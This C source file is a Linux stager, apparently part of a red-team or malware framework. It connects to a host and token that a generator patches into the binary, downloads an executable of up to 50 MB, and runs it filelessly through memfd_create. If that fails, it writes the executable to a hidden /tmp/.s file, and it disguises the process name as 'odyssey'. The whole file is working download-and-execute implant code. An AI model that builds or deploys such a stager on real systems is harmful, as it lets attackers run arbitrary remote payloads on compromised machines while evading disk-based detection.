#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define STAGER_MAGIC       0x4F445353u
#define STAGER_MAX_BINARY  (50u * 1024u * 1024u)
#define STAGER_MAX_ARGS    4096
#define STAGER_AUTH_OK     0x01

#define CONNECT_TIMEOUT_SEC 5
#define RECV_TIMEOUT_SEC    30

/*
 * Sentinel buffers: exactly 256 bytes each, NUL-padded.
 * The generator patches these in the compiled binary before base64 encoding.
 * The prefix pattern is chosen to be unique and not appear elsewhere.
 */
static char S_HOST[256] = "@@STAGER_HOST@@\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";

static char S_PORT[16] = "@@STAGER_PORT@@";

static char S_TOKEN[256] = "@@STAGER_TOKEN@\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";

static void err_exit(const char *msg) {
    (void)write(STDERR_FILENO, msg, strlen(msg));
    (void)write(STDERR_FILENO, "\n", 1);
    _exit(1);
}

static int recv_exact(int fd, void *buf, size_t n) {
    size_t done = 0;
    while (done < n) {
        ssize_t r = recv(fd, (char *)buf + done, n - done, 0);
        if (r <= 0) return -1;
        done += (size_t)r;
    }
    return 0;
}

static int send_all(int fd, const void *buf, size_t n) {
    size_t done = 0;
    while (done < n) {
        ssize_t w = send(fd, (const char *)buf + done, n - done, 0);
        if (w <= 0) return -1;
        done += (size_t)w;
    }
    return 0;
}

static int try_memfd_exec(const void *bin, size_t bin_len,
                          char **argv, char **envp) {
#ifdef SYS_memfd_create
    int fd = (int)syscall(SYS_memfd_create, "", 1u);
    if (fd < 0) return -1;

    if (write(fd, bin, bin_len) != (ssize_t)bin_len) {
        close(fd);
        return -1;
    }

    char path[64];
    int len = 0;
    const char *prefix = "/proc/self/fd/";
    size_t plen = strlen(prefix);
    memcpy(path, prefix, plen);
    len = (int)plen;
    char num[16];
    int nlen = 0;
    int tmp = fd;
    if (tmp == 0) { num[nlen++] = '0'; }
    else { while (tmp > 0) { num[nlen++] = '0' + (tmp % 10); tmp /= 10; } }
    for (int i = nlen - 1; i >= 0; i--) path[len++] = num[i];
    path[len] = '\0';

    execve(path, argv, envp);
    close(fd);
#else
    (void)bin; (void)bin_len; (void)argv; (void)envp;
#endif
    return -1;
}

static void file_exec(const void *bin, size_t bin_len,
                      char **argv, char **envp) {
    const char *fpath = "/tmp/.s";
    int fd = open(fpath, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (fd < 0) err_exit("open");

    const char *p = (const char *)bin;
    size_t left = bin_len;
    while (left > 0) {
        ssize_t w = write(fd, p, left);
        if (w <= 0) { close(fd); err_exit("write"); }
        p += w;
        left -= (size_t)w;
    }
    close(fd);

    argv[0] = (char *)fpath;
    execve(fpath, argv, envp);
    err_exit("execve");
}

int main(int argc, char **argv, char **envp) {

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) err_exit("socket");

    struct timeval tv;
    tv.tv_sec = CONNECT_TIMEOUT_SEC;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    tv.tv_sec = RECV_TIMEOUT_SEC;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint16_t port = 0;
    { const char *p = S_PORT; while (*p >= '0' && *p <= '9') { port = port * 10 + (*p - '0'); p++; } }

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    if (inet_pton(AF_INET, S_HOST, &sa.sin_addr) != 1)
        err_exit("bad host");

    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        err_exit("connect");

    const char *token = S_TOKEN;
    uint32_t token_len = (uint32_t)strlen(token);
    uint32_t magic_be = htonl(STAGER_MAGIC);
    uint32_t tlen_be = htonl(token_len);

    if (send_all(sock, &magic_be, 4) < 0) err_exit("send magic");
    if (send_all(sock, &tlen_be, 4) < 0) err_exit("send tlen");
    if (send_all(sock, token, token_len) < 0) err_exit("send token");

    uint8_t status;
    if (recv_exact(sock, &status, 1) < 0) err_exit("recv status");
    if (status != STAGER_AUTH_OK) err_exit("auth failed");

    uint32_t bin_len_be;
    if (recv_exact(sock, &bin_len_be, 4) < 0) err_exit("recv bin len");
    uint32_t bin_len = ntohl(bin_len_be);
    if (bin_len > STAGER_MAX_BINARY) err_exit("too large");

    void *bin = malloc(bin_len);
    if (!bin) err_exit("malloc");
    if (recv_exact(sock, bin, bin_len) < 0) err_exit("recv binary");

    uint32_t args_len_be;
    if (recv_exact(sock, &args_len_be, 4) < 0) err_exit("recv args len");
    uint32_t args_len = ntohl(args_len_be);
    if (args_len > STAGER_MAX_ARGS) err_exit("args too large");

    char *args_buf = (char *)malloc(args_len + 1);
    if (!args_buf) err_exit("malloc args");
    if (args_len > 0 && recv_exact(sock, args_buf, args_len) < 0)
        err_exit("recv args");
    args_buf[args_len] = '\0';

    close(sock);

    int arg_count = 0;
    for (uint32_t i = 0; i < args_len; i++) {
        if (args_buf[i] == '\0') arg_count++;
    }

    char **exec_argv;

    if (argc > 1) {
        exec_argv = (char **)malloc(((size_t)argc + 1) * sizeof(char *));
        if (!exec_argv) err_exit("malloc argv");
        exec_argv[0] = (char *)"odyssey";
        for (int i = 1; i < argc; i++) exec_argv[i] = argv[i];
        exec_argv[argc] = NULL;
    } else {
        exec_argv = (char **)malloc((arg_count + 2) * sizeof(char *));
        if (!exec_argv) err_exit("malloc argv");
        exec_argv[0] = (char *)"odyssey";
        int idx = 1;
        if (args_len > 0) {
            exec_argv[idx++] = args_buf;
            for (uint32_t i = 0; i < args_len - 1; i++) {
                if (args_buf[i] == '\0') {
                    exec_argv[idx++] = &args_buf[i + 1];
                }
            }
        }
        exec_argv[idx] = NULL;
    }

    try_memfd_exec(bin, bin_len, exec_argv, envp);
    file_exec(bin, bin_len, exec_argv, envp);

    return 1;
}
